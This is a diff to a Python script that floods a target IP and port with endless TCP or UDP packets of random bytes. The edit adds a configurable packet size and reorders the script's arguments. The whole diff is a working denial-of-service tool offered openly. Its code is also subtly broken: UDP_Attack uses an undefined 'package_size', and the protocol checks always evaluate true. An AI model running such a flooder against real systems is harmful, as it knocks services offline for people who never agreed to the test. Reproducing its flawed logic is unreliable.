@@ -14,49 +14,49 @@ banner = """
 
 # Function declaration part
 def Usage():
-    print("Usage: ", sys.argv[0], "<ip> <port> <protocol>")
+    print("Usage: ", sys.argv[0], "<ip> <protocol> <port> <package size>")
 
-def TCP_Attack(target, port):
+def TCP_Attack(target, port, package_size):
     tcp_serv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     tcp_serv.connect((target, port))
 
-    byte = os.urandom(1024)
+    byte = os.urandom(package_size)
     
     sent = 1
     while True:
         tcp_serv.send(byte)
-        print("Sending ", sent, "TCP Package to", target, "on Port ", port)
+        print("Sending ", sent, "TCP Package with size ", package_size, "to", target, "on Port ", port)
         sent = sent + 1
 
-def UDP_Attack(target, port):
+def UDP_Attack(target, port, package):
     udp_serv = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
-    byte = os.urandom(1024)
+    byte = os.urandom(package_size)
 
     sent = 1
     while True:
         udp_serv.sendto(byte, (target, port))
-        print("Sending ", sent, "UDP Package to", target, "on Port ", port)
+        print("Sending ", sent, "UDP Package with size ", package_size, "to ", target, "on Port ", port)
         sent = sent + 1
 
 # Working part
 class Main():
     print(banner)
-    if len(sys.argv) != 4:
+    if len(sys.argv) != 5:
         Usage()
 
     else:
-        if sys.argv[3] == "TCP" or "tcp":
+        if sys.argv[2] == "TCP" or "tcp":
             try:
-                TCP_Attack(str(sys.argv[1]), int(sys.argv[2]))
+                TCP_Attack(str(sys.argv[1]), int(sys.argv[3]), int(sys.argv[4]))
 
             except ConnectionRefusedError:
                 print("Error, Connection Refused...!")
                 sys.exit()
 
-        if sys.argv[3] == "UDP" or "udp":
+        if sys.argv[2] == "UDP" or "udp":
             try:
-                UDP_Attack(str(sys.argv[1]), int(sys.argv[2]))
+                UDP_Attack(str(sys.argv[1]), int(sys.argv[3]), int(sys.argv[4]))
 
             except ConnectionRefusedError:
                 print("Error, Connection Refused...!")
